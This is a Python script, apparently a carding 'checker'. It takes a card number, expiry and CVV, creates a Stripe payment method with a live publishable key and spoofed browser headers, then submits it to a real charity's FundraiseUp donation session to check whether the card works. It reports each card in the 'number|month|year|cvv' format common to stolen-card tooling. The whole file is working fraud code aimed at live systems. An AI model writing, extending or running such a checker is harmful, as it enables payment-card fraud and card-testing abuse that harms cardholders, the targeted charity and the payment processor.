import requests


def verificar_stripe(numero, mes, ano, cvv):
    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10)",
    }

    data = (
        f"type=card&card[number]={numero}&card[cvc]={cvv}"
        f"&card[exp_month]={mes}&card[exp_year]={ano}"
        "&guid=abc123&muid=abc123&sid=abc123"
        "&payment_user_agent=stripe.js%2Fv3%3B+card-element"
        "&referrer=https%3A%2F%2Fexample.com&time_on_page=1234"
        "&key=pk_live_9RzCojmneCvL31GhYTknluXp"
        "&_stripe_account=acct_1FYyyOKsW8pKyVU0"
        "&_stripe_version=2025-02-24.acacia"
    )

    response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
    res_json = response.json()

    # Si hay error en el primer request
    if "error" in res_json:
        code = res_json["error"].get("code", "N/A")
        message = res_json["error"].get("message", "Sin mensaje")
        return (
            "Stripe\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
            f"❌ {numero}|{mes}|{ano}|{cvv}\n"
            f"Error: {code}\n"
            f"Mensaje: {message}\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈="
        )

    # Continuar si no hubo error
    payment_id = res_json.get("id", "Desconocido")

    h2 = {
        "authority": "api.fundraiseup.com",
        "content-type": "application/json",
        "origin": "https://ycspca.org",
        "referer": "https://ycspca.org/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10)",
    }

    d1 = {
        "paymentMethod": {
            "id": payment_id,
            "object": "payment_method",
            "type": "card",
            "card": {"brand": "mastercard"},
        }
    }

    r2 = requests.post(
        "https://api.fundraiseup.com/paymentSession/3093935748576308463/pay",
        headers=h2,
        json=d1,
    )

    # Si el segundo request devuelve JSON válido
    try:
        r2_json = r2.json()
        success = r2_json.get("success", False)
        if success:
            status = "Success"
        else:
            status = r2_json.get("error", {}).get("message", "Fallo desconocido")
    except Exception:
        status = "Respuesta no válida"

    return (
        "Stripe\n"
        "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
        f"✅ {numero}|{mes}|{ano}|{cvv}\n"
        f"ID: {payment_id}\n"
        f"Resultado: {status}\n"
        "=≈=≈=≈=≈=≈=≈=≈=≈=≈="
    )
